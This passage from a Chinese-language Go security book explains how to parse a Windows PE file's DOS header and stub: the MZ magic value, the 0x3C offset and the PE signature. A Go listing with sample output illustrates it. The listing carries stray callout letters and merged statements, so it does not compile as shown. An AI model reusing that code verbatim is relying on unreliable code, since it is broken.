图 12-6 所示的自顶向下 PE 数据结构的第一部分为 DOS 头。以下唯一值始终存在于任何基于 Windows DOS 的可执行二进制文件中：`0x4D 0x5A` （或者ASCII 中的 MZ），恰当地将该文件声明为 Windows 可执行文件。所有 PE 文件中普遍存在的另一个值位于偏移量  `0x3C`。此偏移量处的值指向包含 PE 文件签名的另一个偏移量： `0x50 0x45 0x00 0x00`（或 ASCII 中的 PE）。

紧随其后的头文件是 DOS Stub，总是用十六进制的值表示`This program cannot be run in DOS mode`；当编译器的` /STUB` 链接器选项提供任意字符串值时，就会发生这种情况的例外。如果用你最喜欢的十六进制编辑器打开 Telegram 应用程序，它应该类似于图 12-7。所有这些值都存在。

![](https://github.com/YYRise/black-hat-go/raw/master/ch-12/images/12-7.png)
图12-7：典型的PE二进制格式的文件头

到目前为止，已经描述了 DOS Header 和 Stub，同时还通过十六进制编辑器查看了十六进制表示。现在，让我们看看用 Go 代码解析这些相同的值，如清单 12-15 中的那样。

```go
    dosHeader := make([]byte, 96) sizeOffset := make([]byte, 4)
    // Dec to Ascii (searching for MZ)
    _, err = f.Read(dosHeader)u
    check(err)
    fmt.Println("[-----DOS Header / Stub-----]")
    fmt.Printf("[+] Magic Value: %s%s\n", string(dosHeader[0]), string(dosHeader[1]))v
    // Validate PE+0+0 (Valid PE format)
    pe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:]))w f.ReadAt(sizeOffset[:], pe_sig_offset)x
    fmt.Println("[-----Signature Header-----]")
    fmt.Printf("[+] LFANEW Value: %s\n", string(sizeOffset))
/* OUTPUT
[-----DOS Header / Stub-----] 
[+] Magic Value: MZ 
[-----Signature Header-----] 
[+] LFANEW Value: PE
*/
```

清单 12-15： 解析 DOS Header 和 Stub 的值 (/ch-12/peParser/main.go)

使用Go的`file Reader`实例从文件头开始向前读取96字节，来确认初始二进制签名。 回想下前两个字节规定ASCII 的 `MZ`。 PE包方便了将PE数据结构转换成其他易使用的数据。 但是，仍然需要手动二进制读取器和按位功能来实现它。我们对 0x3c 引用的偏移值执行二进制读取，然后准确读取由值 0x50 0x45 (PE) 和 2 0x00 字节组成的 4 个字节。
